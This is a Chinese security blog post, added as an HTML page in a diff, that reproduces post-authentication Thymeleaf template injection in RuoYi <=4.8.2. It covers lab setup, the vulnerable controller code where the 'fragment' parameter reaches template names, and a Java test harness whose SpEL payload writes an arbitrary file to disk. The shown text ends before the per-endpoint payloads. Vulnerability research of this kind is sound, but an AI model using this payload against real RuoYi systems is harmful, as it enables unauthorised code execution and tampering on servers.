@@ -1,0 +1,968 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Infernity">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="免责声明本文内容仅用于网络安全技术学习、研究与交流，文中涉及的漏洞分析、复现过程及 PoC 示例仅面向合法授权的测试环境。请勿将本文中的任何技术、代码或方法用于未授权的系统、网络或设备，否则由此产生的一切法律责任及后果均由使用者自行承担。 作者不鼓励、不支持任何形式的非法入侵、攻击、破坏、数据窃取或其他违法违规行为。读者在学习和实践相关内容时，应严格遵守所在国家或地区的法律法规，并确保已获得明确授">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RuoYi&lt;&#x3D;4.8.2后台代码执行">
+<meta property="og:url" content="http://example.com/2026/05/13/RuoYi4-8-2/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="免责声明本文内容仅用于网络安全技术学习、研究与交流，文中涉及的漏洞分析、复现过程及 PoC 示例仅面向合法授权的测试环境。请勿将本文中的任何技术、代码或方法用于未授权的系统、网络或设备，否则由此产生的一切法律责任及后果均由使用者自行承担。 作者不鼓励、不支持任何形式的非法入侵、攻击、破坏、数据窃取或其他违法违规行为。读者在学习和实践相关内容时，应严格遵守所在国家或地区的法律法规，并确保已获得明确授">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/ruoyi4-8-2/ruoyi.png">
+<meta property="article:published_time" content="2026-05-13T09:31:26.000Z">
+<meta property="article:modified_time" content="2026-05-13T09:38:22.274Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="JAVA">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/ruoyi4-8-2/ruoyi.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>RuoYi&lt;=4.8.2后台代码执行 - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">RuoYi<=4.8.2后台代码执行</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-05-13 17:31" pubdate>
+          2026年5月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          65 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">RuoYi&lt;=4.8.2后台代码执行</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文内容仅用于网络安全技术学习、研究与交流，文中涉及的漏洞分析、复现过程及 PoC 示例仅面向合法授权的测试环境。请勿将本文中的任何技术、代码或方法用于未授权的系统、网络或设备，否则由此产生的一切法律责任及后果均由使用者自行承担。</p>
+<p>作者不鼓励、不支持任何形式的非法入侵、攻击、破坏、数据窃取或其他违法违规行为。读者在学习和实践相关内容时，应严格遵守所在国家或地区的法律法规，并确保已获得明确授权。</p>
+<p>另外，本文部分内容可能由 AI 生成，仅供参考。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h3 id="克隆-RuoYi-主仓库"><a href="#克隆-RuoYi-主仓库" class="headerlink" title="克隆 RuoYi 主仓库"></a>克隆 RuoYi 主仓库</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">git clone https://github.com/yangzongzhuan/RuoYi.git RuoYi-main<br></code></pre></td></tr></table></figure>
+
+<p>进入仓库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd .\RuoYi-main<br>git fetch --all --tags<br>git tag<br></code></pre></td></tr></table></figure>
+
+<p>能看到类似：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">v4.7.9<br>v4.8.0<br>v4.8.1<br>v4.8.2<br>v4.8.3<br></code></pre></td></tr></table></figure>
+
+<p>GitHub Releases 显示当前 RuoYi 有 v4.8.3、v4.8.2、v4.8.1、v4.8.0、v4.7.9 等历史版本，适合用来做版本对比和漏洞复现。</p>
+<h3 id="用-git-worktree-建多个版本目录"><a href="#用-git-worktree-建多个版本目录" class="headerlink" title="用 git worktree 建多个版本目录"></a>用 git worktree 建多个版本目录</h3><p>仍然在：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">C:\Users\13664\Desktop\ruoyi_lab\RuoYi-main<br></code></pre></td></tr></table></figure>
+
+<p>执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">git worktree add ..\RuoYi-v4.8.3 v4.8.3<br>git worktree add ..\RuoYi-v4.8.2 v4.8.2<br>git worktree add ..\RuoYi-v4.8.1 v4.8.1<br>git worktree add ..\RuoYi-v4.8.0 v4.8.0<br>git worktree add ..\RuoYi-v4.7.9 v4.7.9<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778305603691-986abed8-59f4-4814-8101-2f6e89155850.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="在-MySQL-9-0-里创建多个数据库"><a href="#在-MySQL-9-0-里创建多个数据库" class="headerlink" title="在 MySQL 9.0 里创建多个数据库"></a>在 MySQL 9.0 里创建多个数据库</h3><p>登录 MySQL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">mysql -uroot -p<br></code></pre></td></tr></table></figure>
+
+<p>输入 root 密码后，执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">CREATE DATABASE ry_483 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;<br>CREATE DATABASE ry_482 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;<br>CREATE DATABASE ry_481 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;<br>CREATE DATABASE ry_480 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;<br>CREATE DATABASE ry_479 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;<br></code></pre></td></tr></table></figure>
+
+<p>建议单独建一个实验账号，不要直接用 root：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">CREATE USER &#x27;ruoyi_lab&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;RuoyiLab@123456&#x27;;<br><br>GRANT ALL PRIVILEGES ON ry_483.* TO &#x27;ruoyi_lab&#x27;@&#x27;localhost&#x27;;<br>GRANT ALL PRIVILEGES ON ry_482.* TO &#x27;ruoyi_lab&#x27;@&#x27;localhost&#x27;;<br>GRANT ALL PRIVILEGES ON ry_481.* TO &#x27;ruoyi_lab&#x27;@&#x27;localhost&#x27;;<br>GRANT ALL PRIVILEGES ON ry_480.* TO &#x27;ruoyi_lab&#x27;@&#x27;localhost&#x27;;<br>GRANT ALL PRIVILEGES ON ry_479.* TO &#x27;ruoyi_lab&#x27;@&#x27;localhost&#x27;;<br><br>FLUSH PRIVILEGES;<br></code></pre></td></tr></table></figure>
+
+<h3 id="给每个版本导入-SQL"><a href="#给每个版本导入-SQL" class="headerlink" title="给每个版本导入 SQL"></a>给每个版本导入 SQL</h3><p>我这里用navicat导入sql文件。</p>
+<p><img src="/./img/ruoyi4-8-2/1778305660470-b3ea09a7-3838-431b-93d1-3105d9487a99.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./img/ruoyi4-8-2/1778305684758-42c6c3c3-1bea-400b-9fb3-e67b630e2e3b.png" srcset="/img/loading.gif" lazyload></p>
+<p>把这两个文件全部导入即可。</p>
+<h3 id="修改每个版本的数据库配置"><a href="#修改每个版本的数据库配置" class="headerlink" title="修改每个版本的数据库配置"></a>修改每个版本的数据库配置</h3><p>配置文件位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ruoyi-admin\src\main\resources\application-druid.yml<br></code></pre></td></tr></table></figure>
+
+<p>以 v4.7.9 为例，打开：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">notepad C:\Users\13664\Desktop\ruoyi_lab\RuoYi-v4.7.9\ruoyi-admin\src\main\resources\application-druid.yml<br></code></pre></td></tr></table></figure>
+
+<p>找到 <code>master</code> 数据源，改成类似这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain"># 主库数据源<br>master:<br>    url: jdbc:mysql://127.0.0.1:3306/ry_479?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;allowPublicKeyRetrieval=true<br>    username: ruoyi_lab<br>    password: RuoyiLab@123456<br></code></pre></td></tr></table></figure>
+
+<h3 id="IDEA里修改运行时端口"><a href="#IDEA里修改运行时端口" class="headerlink" title="IDEA里修改运行时端口"></a>IDEA里修改运行时端口</h3><p>在这个窗口右上角点：<code>修改选项(M) -&gt; 添加 VM 选项</code></p>
+<p><img src="/./img/ruoyi4-8-2/1778298789458-eda8e433-f703-46ea-b4c2-1d70b8e48c28.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./img/ruoyi4-8-2/1778298803314-a62e93ee-9f12-4491-9c3c-cad17b29a2be.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后会多出一个 <strong>VM 选项</strong> 输入框，里面填：<code>-Dserver.port=47900</code>，应用即可。</p>
+<p><img src="/./img/ruoyi4-8-2/1778298844726-314b6e00-606b-4e30-ac3e-462246ff0f1a.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后运行即可。</p>
+<p><img src="/./img/ruoyi4-8-2/1778305833625-6fe9723f-9f97-4794-8733-d58cae1b64f7.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="可以直接利用若依依赖的测试环境调试："><a href="#可以直接利用若依依赖的测试环境调试：" class="headerlink" title="可以直接利用若依依赖的测试环境调试："></a>可以直接利用若依依赖的测试环境调试：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.springframework.context.support.GenericApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.format.support.DefaultFormattingConversionService;<br><span class="hljs-keyword">import</span> org.thymeleaf.context.Context;<br><span class="hljs-keyword">import</span> org.thymeleaf.spring5.SpringTemplateEngine;<br><span class="hljs-keyword">import</span> org.thymeleaf.spring5.expression.ThymeleafEvaluationContext;<br><span class="hljs-keyword">import</span> org.thymeleaf.templatemode.TemplateMode;<br><span class="hljs-keyword">import</span> org.thymeleaf.templateresolver.StringTemplateResolver;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.setProperty(<span class="hljs-string">&quot;org.slf4j.simpleLogger.defaultLogLevel&quot;</span>, <span class="hljs-string">&quot;warn&quot;</span>);<br>        System.setProperty(<span class="hljs-string">&quot;org.slf4j.simpleLogger.log.org.thymeleaf&quot;</span>, <span class="hljs-string">&quot;off&quot;</span>);<br><br>        <span class="hljs-comment">// 1. StringTemplateResolver：纯代码字符串模板</span><br>        <span class="hljs-type">StringTemplateResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTemplateResolver</span>();<br>        resolver.setTemplateMode(TemplateMode.HTML);<br>        resolver.setCacheable(<span class="hljs-literal">false</span>);<br><br>        <span class="hljs-comment">// 2. SpringTemplateEngine：使用 SpringEL</span><br>        <span class="hljs-type">SpringTemplateEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringTemplateEngine</span>();<br>        engine.setTemplateResolver(resolver);<br><br>        <span class="hljs-comment">// 3. 创建一个最小 Spring ApplicationContext</span><br>        <span class="hljs-type">GenericApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericApplicationContext</span>();<br>        applicationContext.refresh();<br><br>        <span class="hljs-comment">// 4. 创建 ThymeleafEvaluationContext</span><br>        <span class="hljs-type">ThymeleafEvaluationContext</span> <span class="hljs-variable">evaluationContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThymeleafEvaluationContext</span>(<br>                applicationContext,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultFormattingConversionService</span>()<br>        );<br><br>        <span class="hljs-comment">// 5. 创建 Thymeleaf Context</span><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Context</span>();<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 关键点：</span><br><span class="hljs-comment">         * 手动放入 ThymeleafEvaluationContext。</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * Spring MVC / 若依正常渲染时，框架会自动放这个。</span><br><span class="hljs-comment">         * 纯代码测试时需要自己放。</span><br><span class="hljs-comment">         */</span><br>        context.setVariable(<br>                ThymeleafEvaluationContext.THYMELEAF_EVALUATION_CONTEXT_CONTEXT_VARIABLE_NAME,<br>                evaluationContext<br>        );<br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;&#123;new com.fasterxml.jackson.databind.ObjectMapper().createGenerator(new org.springframework.core.io.FileSystemResource(&#x27;C:/Users/13664/Desktop/1.txt&#x27;).getOutputStream())&#125;.![&#123;writeRaw(&#x27;file content&#x27;), close()&#125;]&#125;&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">unsafeTemplate</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;p th:text=\&quot;%s\&quot;&gt;&quot;</span>.formatted(userInput);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">restrictedResult</span> <span class="hljs-operator">=</span> engine.process(unsafeTemplate, context);<br>        System.out.println(restrictedResult);<br><br>        applicationContext.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="CVE-2025-14856、CVE-2026-4564-后台thymeleaf-SSTI"><a href="#CVE-2025-14856、CVE-2026-4564-后台thymeleaf-SSTI" class="headerlink" title="CVE-2025-14856、CVE-2026-4564 后台thymeleaf SSTI"></a>CVE-2025-14856、CVE-2026-4564 后台thymeleaf SSTI</h2><p><code>/monitor/cache/getnames</code>，<code>fragment</code> 参数代码注入。</p>
+<p><strong>接口&#x2F;monitor&#x2F;cache&#x2F;getNames</strong></p>
+<p><strong>接口&#x2F;monitor&#x2F;cache&#x2F;getKeys</strong></p>
+<p><strong>接口&#x2F;monitor&#x2F;cache&#x2F;getValue</strong></p>
+<p><strong>接口&#x2F;demo&#x2F;form&#x2F;localrefresh&#x2F;task</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ruoyi-admin/src/main/java/com/ruoyi/web/controller/monitor/CacheController.java</span><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:cache:view&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/getNames&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheNames</span><span class="hljs-params">(String fragment, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheNames&quot;</span>, cacheService.getCacheNames());<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:cache:view&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/getKeys&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheKeys</span><span class="hljs-params">(String fragment, String cacheName, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheName&quot;</span>, cacheName);<br>    mmap.put(<span class="hljs-string">&quot;cacheKeys&quot;</span>, cacheService.getCacheKeys(cacheName));<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br><br><span class="hljs-meta">@RequiresPermissions(&quot;monitor:cache:view&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/getValue&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCacheValue</span><span class="hljs-params">(String fragment, String cacheName, String cacheKey, ModelMap mmap)</span><br>&#123;<br>    mmap.put(<span class="hljs-string">&quot;cacheName&quot;</span>, cacheName);<br>    mmap.put(<span class="hljs-string">&quot;cacheKey&quot;</span>, cacheKey);<br>    mmap.put(<span class="hljs-string">&quot;cacheValue&quot;</span>, cacheService.getCacheValue(cacheName, cacheKey));<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/cache::&quot;</span> + fragment;<br>&#125;<br><br><span class="hljs-comment">//ruoyi-admin/src/main/java/com/ruoyi/web/controller/demo/controller/DemoFormController.java</span><br><span class="hljs-meta">@PostMapping(&quot;/localrefresh/task&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">localRefreshTask</span><span class="hljs-params">(String fragment, String taskName, ModelMap mmap)</span><br>&#123;<br>    <span class="hljs-type">JSONArray</span> <span class="hljs-variable">list</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>    <span class="hljs-type">JSONObject</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    item.put(<span class="hljs-string">&quot;name&quot;</span>, StringUtils.defaultIfBlank(taskName, <span class="hljs-string">&quot;通过电话销售过程中了解各盛市的设备仪器使用、采购情况及相关重要追踪人&quot;</span>));<br>    item.put(<span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;新增&quot;</span>);<br>    item.put(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;2018.06.10&quot;</span>);<br>    list.add(item);<br>    item = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>    item.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;提高自己电话营销技巧，灵活专业地与客户进行电话交流&quot;</span>);<br>    item.put(<span class="hljs-string">&quot;type&quot;</span>, <span class="hljs-string">&quot;新增&quot;</span>);<br>    item.put(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;2018.06.12&quot;</span>);<br>    list.add(item);<br>    mmap.put(<span class="hljs-string">&quot;tasks&quot;</span>, list);<br>    <span class="hljs-keyword">return</span> prefix + <span class="hljs-string">&quot;/localrefresh::&quot;</span> + fragment;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>org/thymeleaf/spring6/view/ThymeleafView.java::renderFragment</code>中的判断条件：</p>
+<p><img src="/./img/ruoyi4-8-2/image-20260513164915476.png" srcset="/img/loading.gif" lazyload alt="image-20260513164915476"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">if (!viewTemplateName.contains(&quot;::&quot;)) &#123;<br></code></pre></td></tr></table></figure>
+
+<p>即只有当模板名包含<code>::</code>时，才能够进入到<code>parseExpression</code>，也才会将其作为表达式去进行执行。</p>
+<p>若依里自带<code>::</code>，所以我们后面的payload都不需要带了。</p>
